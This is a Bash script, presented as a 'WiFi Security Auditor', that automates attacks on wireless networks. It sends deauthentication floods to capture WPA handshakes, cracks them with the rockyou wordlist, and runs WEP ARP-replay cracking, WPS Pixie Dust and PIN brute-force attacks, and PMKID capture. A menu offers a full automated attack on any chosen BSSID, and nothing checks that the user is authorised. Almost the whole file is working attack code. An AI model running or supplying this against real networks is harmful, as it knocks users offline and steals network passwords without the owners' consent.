#!/bin/bash

# WiFi Security Auditor - Comprehensive Wireless Network Security Testing
# Supports WEP, WPA/WPA2-PSK, WPA/WPA2-Enterprise, WPS attacks
# Uses aircrack-ng suite and related tools

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Configuration
WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR="./wifi_audit_$(date +%Y%m%d_%H%M%S)"
INTERFACE=""
MONITOR_INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
ATTACK_MODE=""

print_banner() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║                                                                ║"
    echo "║           WiFi Security Auditor v1.0                           ║"
    echo "║        Comprehensive Wireless Network Testing                  ║"
    echo "║                                                                ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_header() {
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

print_info() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        print_error "This script must be run as root"
        exit 1
    fi
}

check_dependencies() {
    print_header "Checking Dependencies"
    
    local deps=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "wash" "reaver" "bully")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if command -v "$dep" &> /dev/null; then
            print_success "$dep installed"
        else
            print_warning "$dep not found"
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        print_error "Missing dependencies: ${missing[*]}"
        print_info "Install with: sudo apt install aircrack-ng reaver"
        exit 1
    fi
}

kill_interfering_processes() {
    print_header "Killing Interfering Processes"
    airmon-ng check kill 2>&1 | tee "$OUTPUT_DIR/airmon_check.log"
}

enable_monitor_mode() {
    print_header "Enabling Monitor Mode"
    
    if [ -z "$INTERFACE" ]; then
        print_info "Available interfaces:"
        iwconfig 2>&1 | grep -E "^[a-z]" | awk '{print $1}'
        read -p "Enter interface name: " INTERFACE
    fi
    
    print_info "Starting monitor mode on $INTERFACE..."
    airmon-ng start "$INTERFACE" 2>&1 | tee "$OUTPUT_DIR/monitor_mode.log"
    
    # Detect monitor interface name
    MONITOR_INTERFACE=$(iwconfig 2>&1 | grep "Mode:Monitor" | awk '{print $1}')
    
    if [ -z "$MONITOR_INTERFACE" ]; then
        print_error "Failed to enable monitor mode"
        exit 1
    fi
    
    print_success "Monitor mode enabled on $MONITOR_INTERFACE"
}

disable_monitor_mode() {
    if [ -n "$MONITOR_INTERFACE" ]; then
        print_header "Disabling Monitor Mode"
        airmon-ng stop "$MONITOR_INTERFACE" 2>&1
        print_success "Monitor mode disabled"
    fi
}

scan_networks() {
    print_header "Scanning for Wireless Networks"
    print_info "Scanning for 30 seconds... Press Ctrl+C when done"
    
    local scan_file="$OUTPUT_DIR/scan"
    
    timeout 30 airodump-ng "$MONITOR_INTERFACE" -w "$scan_file" --output-format csv 2>&1 || true
    
    if [ -f "${scan_file}-01.csv" ]; then
        print_success "Scan complete. Networks found:"
        echo ""
        
        # Parse and display networks
        tail -n +3 "${scan_file}-01.csv" | grep -E "^([0-9A-F]{2}:){5}[0-9A-F]{2}" | \
        awk -F',' '{printf "%-20s %-6s %-8s %-10s %s\n", $14, $4, $6, $9, $1}' | \
        head -20
        
        echo ""
    else
        print_error "No networks found"
        exit 1
    fi
}

select_target() {
    print_header "Target Selection"
    
    read -p "Enter target BSSID (MAC address): " TARGET_BSSID
    read -p "Enter target channel: " TARGET_CHANNEL
    read -p "Enter target ESSID (network name): " TARGET_ESSID
    
    print_info "Target: $TARGET_ESSID ($TARGET_BSSID) on channel $TARGET_CHANNEL"
}

detect_encryption() {
    print_header "Detecting Encryption Type"
    
    local scan_file="$OUTPUT_DIR/target_scan"
    
    timeout 10 airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
        "$MONITOR_INTERFACE" -w "$scan_file" --output-format csv 2>&1 || true
    
    if [ -f "${scan_file}-01.csv" ]; then
        local encryption=$(grep "$TARGET_BSSID" "${scan_file}-01.csv" | awk -F',' '{print $6}' | tr -d ' ')
        print_info "Detected encryption: $encryption"
        
        if [[ "$encryption" == *"WEP"* ]]; then
            echo "WEP"
        elif [[ "$encryption" == *"WPA2"* ]]; then
            echo "WPA2"
        elif [[ "$encryption" == *"WPA"* ]]; then
            echo "WPA"
        else
            echo "UNKNOWN"
        fi
    else
        echo "UNKNOWN"
    fi
}

capture_handshake() {
    print_header "Capturing WPA/WPA2 Handshake"
    
    local capture_file="$OUTPUT_DIR/handshake"
    
    print_info "Starting packet capture on $TARGET_ESSID..."
    print_info "Waiting for handshake... This may take a while"
    print_warning "You may need to deauthenticate clients to force reconnection"
    
    # Start capture in background
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
        -w "$capture_file" "$MONITOR_INTERFACE" &
    
    local AIRODUMP_PID=$!
    
    sleep 5
    
    # Deauth attack to force handshake
    print_info "Sending deauthentication packets..."
    timeout 30 aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$MONITOR_INTERFACE" 2>&1 || true
    
    sleep 10
    
    # Check for handshake
    print_info "Checking for captured handshake..."
    kill $AIRODUMP_PID 2>/dev/null || true
    
    if ls "${capture_file}"-*.cap 1> /dev/null 2>&1; then
        if aircrack-ng "${capture_file}"-*.cap 2>&1 | grep -q "1 handshake"; then
            print_success "Handshake captured successfully!"
            echo "$capture_file"
        else
            print_warning "No handshake captured. Try again or wait for clients to connect."
            echo ""
        fi
    else
        print_error "Capture failed"
        echo ""
    fi
}

crack_wpa_handshake() {
    local capture_file="$1"
    
    print_header "Cracking WPA/WPA2 Handshake"
    
    if [ ! -f "$WORDLIST" ]; then
        print_error "Wordlist not found: $WORDLIST"
        print_info "Extracting rockyou.txt..."
        
        if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            gunzip -k /usr/share/wordlists/rockyou.txt.gz
            WORDLIST="/usr/share/wordlists/rockyou.txt"
        else
            print_error "rockyou.txt not found. Please specify wordlist location."
            read -p "Enter wordlist path: " WORDLIST
        fi
    fi
    
    print_info "Using wordlist: $WORDLIST"
    print_info "Starting dictionary attack..."
    print_warning "This may take a long time depending on wordlist size"
    
    aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "${capture_file}"-*.cap 2>&1 | \
        tee "$OUTPUT_DIR/crack_result.txt"
    
    # Check if password was found
    if grep -q "KEY FOUND" "$OUTPUT_DIR/crack_result.txt"; then
        print_success "Password cracked!"
        grep "KEY FOUND" "$OUTPUT_DIR/crack_result.txt"
    else
        print_warning "Password not found in wordlist"
    fi
}

attack_wep() {
    print_header "WEP Attack - ARP Replay"
    
    local capture_file="$OUTPUT_DIR/wep_capture"
    
    print_info "Starting WEP packet capture..."
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
        -w "$capture_file" "$MONITOR_INTERFACE" &
    
    local AIRODUMP_PID=$!
    
    sleep 5
    
    print_info "Attempting fake authentication..."
    aireplay-ng -1 0 -a "$TARGET_BSSID" "$MONITOR_INTERFACE" 2>&1 | tee "$OUTPUT_DIR/fake_auth.log"
    
    print_info "Starting ARP replay attack..."
    print_info "Waiting for ARP packets... This may take several minutes"
    
    timeout 300 aireplay-ng -3 -b "$TARGET_BSSID" "$MONITOR_INTERFACE" 2>&1 | \
        tee "$OUTPUT_DIR/arp_replay.log" || true
    
    sleep 10
    kill $AIRODUMP_PID 2>/dev/null || true
    
    print_info "Attempting to crack WEP key..."
    aircrack-ng "${capture_file}"-*.cap 2>&1 | tee "$OUTPUT_DIR/wep_crack.txt"
    
    if grep -q "KEY FOUND" "$OUTPUT_DIR/wep_crack.txt"; then
        print_success "WEP key cracked!"
        grep "KEY FOUND" "$OUTPUT_DIR/wep_crack.txt"
    else
        print_warning "Not enough IVs captured. Continue capturing or try again."
    fi
}

attack_wps() {
    print_header "WPS Attack"
    
    print_info "Checking if WPS is enabled..."
    wash -i "$MONITOR_INTERFACE" -C 2>&1 | tee "$OUTPUT_DIR/wps_scan.txt" &
    
    local WASH_PID=$!
    sleep 30
    kill $WASH_PID 2>/dev/null || true
    
    if grep -q "$TARGET_BSSID" "$OUTPUT_DIR/wps_scan.txt"; then
        print_success "WPS is enabled on target"
        
        print_info "Attempting Pixie Dust attack with Reaver..."
        timeout 300 reaver -i "$MONITOR_INTERFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
            -vv -K 2>&1 | tee "$OUTPUT_DIR/pixie_dust.log" || true
        
        if grep -q "WPS PIN:" "$OUTPUT_DIR/pixie_dust.log"; then
            print_success "WPS PIN found!"
            grep "WPS PIN:" "$OUTPUT_DIR/pixie_dust.log"
            grep "WPA PSK:" "$OUTPUT_DIR/pixie_dust.log"
        else
            print_warning "Pixie Dust attack failed. Trying brute force..."
            print_info "This will take a very long time..."
            
            timeout 3600 reaver -i "$MONITOR_INTERFACE" -b "$TARGET_BSSID" \
                -c "$TARGET_CHANNEL" -vv 2>&1 | tee "$OUTPUT_DIR/wps_bruteforce.log" || true
        fi
    else
        print_warning "WPS not enabled or not detected on target"
    fi
}

attack_pmkid() {
    print_header "PMKID Attack (Hashcat 22000)"
    
    print_info "Capturing PMKID..."
    local pmkid_file="$OUTPUT_DIR/pmkid_capture"
    
    timeout 60 airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
        -w "$pmkid_file" "$MONITOR_INTERFACE" 2>&1 || true
    
    if ls "${pmkid_file}"-*.cap 1> /dev/null 2>&1; then
        print_info "Converting to hashcat format..."
        
        if command -v hcxpcapngtool &> /dev/null; then
            hcxpcapngtool -o "$OUTPUT_DIR/pmkid.22000" "${pmkid_file}"-*.cap 2>&1
            
            if [ -f "$OUTPUT_DIR/pmkid.22000" ]; then
                print_success "PMKID captured and converted"
                print_info "Crack with: hashcat -m 22000 $OUTPUT_DIR/pmkid.22000 $WORDLIST"
            fi
        else
            print_warning "hcxpcapngtool not installed. Install hcxtools package."
        fi
    fi
}

generate_report() {
    print_header "Generating Report"
    
    local report_file="$OUTPUT_DIR/audit_report.txt"
    
    {
        echo "╔════════════════════════════════════════════════════════════════╗"
        echo "║          WiFi Security Audit Report                            ║"
        echo "╚════════════════════════════════════════════════════════════════╝"
        echo ""
        echo "Date: $(date)"
        echo "Target ESSID: $TARGET_ESSID"
        echo "Target BSSID: $TARGET_BSSID"
        echo "Channel: $TARGET_CHANNEL"
        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Files Generated:"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ls -lh "$OUTPUT_DIR" | tail -n +2
        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Results Summary:"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        
        if [ -f "$OUTPUT_DIR/crack_result.txt" ]; then
            echo ""
            echo "WPA/WPA2 Crack Results:"
            grep -A 5 "KEY FOUND" "$OUTPUT_DIR/crack_result.txt" 2>/dev/null || echo "No password found"
        fi
        
        if [ -f "$OUTPUT_DIR/wep_crack.txt" ]; then
            echo ""
            echo "WEP Crack Results:"
            grep -A 3 "KEY FOUND" "$OUTPUT_DIR/wep_crack.txt" 2>/dev/null || echo "No key found"
        fi
        
        if [ -f "$OUTPUT_DIR/pixie_dust.log" ]; then
            echo ""
            echo "WPS Attack Results:"
            grep -E "WPS PIN:|WPA PSK:" "$OUTPUT_DIR/pixie_dust.log" 2>/dev/null || echo "No PIN found"
        fi
        
    } > "$report_file"
    
    cat "$report_file"
    print_success "Report saved to: $report_file"
}

show_menu() {
    print_banner
    
    echo "Select attack mode:"
    echo ""
    echo "  1) Scan networks"
    echo "  2) WPA/WPA2-PSK attack (handshake + dictionary)"
    echo "  3) WEP attack (ARP replay)"
    echo "  4) WPS attack (Pixie Dust / Brute force)"
    echo "  5) PMKID attack (clientless)"
    echo "  6) Full automated attack (try all methods)"
    echo "  7) Exit"
    echo ""
    read -p "Choice: " choice
    
    case $choice in
        1) ATTACK_MODE="scan" ;;
        2) ATTACK_MODE="wpa" ;;
        3) ATTACK_MODE="wep" ;;
        4) ATTACK_MODE="wps" ;;
        5) ATTACK_MODE="pmkid" ;;
        6) ATTACK_MODE="full" ;;
        7) exit 0 ;;
        *) print_error "Invalid choice"; exit 1 ;;
    esac
}

main() {
    check_root
    print_banner
    check_dependencies
    
    mkdir -p "$OUTPUT_DIR"
    
    if [ -z "$ATTACK_MODE" ]; then
        show_menu
    fi
    
    kill_interfering_processes
    enable_monitor_mode
    
    # Trap to cleanup on exit
    trap 'disable_monitor_mode; exit' INT TERM EXIT
    
    if [ "$ATTACK_MODE" == "scan" ]; then
        scan_networks
        disable_monitor_mode
        exit 0
    fi
    
    scan_networks
    select_target
    
    local encryption=$(detect_encryption)
    
    case "$ATTACK_MODE" in
        wpa)
            local capture_file=$(capture_handshake)
            if [ -n "$capture_file" ]; then
                crack_wpa_handshake "$capture_file"
            fi
            ;;
        wep)
            attack_wep
            ;;
        wps)
            attack_wps
            ;;
        pmkid)
            attack_pmkid
            ;;
        full)
            print_header "Full Automated Attack"
            
            # Try WPS first (fastest if vulnerable)
            attack_wps
            
            # Try PMKID (no clients needed)
            attack_pmkid
            
            # Try handshake capture
            local capture_file=$(capture_handshake)
            if [ -n "$capture_file" ]; then
                crack_wpa_handshake "$capture_file"
            fi
            
            # If WEP, try WEP attack
            if [ "$encryption" == "WEP" ]; then
                attack_wep
            fi
            ;;
    esac
    
    generate_report
    disable_monitor_mode
    
    print_success "Audit complete! Results in: $OUTPUT_DIR"
}

# Run main function
main "$@"
